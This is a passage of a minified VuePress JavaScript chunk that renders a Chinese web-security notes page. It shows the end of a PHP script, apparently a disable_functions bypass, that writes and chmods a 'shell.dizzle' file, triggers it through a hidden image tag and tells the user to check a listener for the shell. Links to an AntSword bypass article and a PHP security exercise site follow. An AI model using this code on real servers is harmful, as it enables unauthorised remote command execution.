punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'shell.dizzle'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//write the file")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Chmod 777"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"shell.dizzle"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0777")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//rwx")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//call the script")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br")])]),a("h3",{attrs:{id:"é€šè¿‡antswordçœ‹ç»•è¿‡disable-functions"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é€šè¿‡antswordçœ‹ç»•è¿‡disable-functions"}},[s._v("#")]),s._v(" "),a("a",{attrs:{href:"https://www.anquanke.com/post/id/195686#h3-3",target:"_blank",rel:"noopener noreferrer"}},[s._v("é€šè¿‡Antswordçœ‹ç»•è¿‡disable_functions"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"phpå®‰å…¨ç»ƒä¹ ç½‘ç«™"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpå®‰å…¨ç»ƒä¹ ç½‘ç«™"}},[s._v("#")]),s._v(" PHPå®‰å…¨ç»ƒä¹ ç½‘ç«™")]),s._v(" "),a("p",[s._v("https://www.ripstech.com/php-security-calendar-2017/")])])}),[],!1,null,null,null);t.default=e.exports}}]);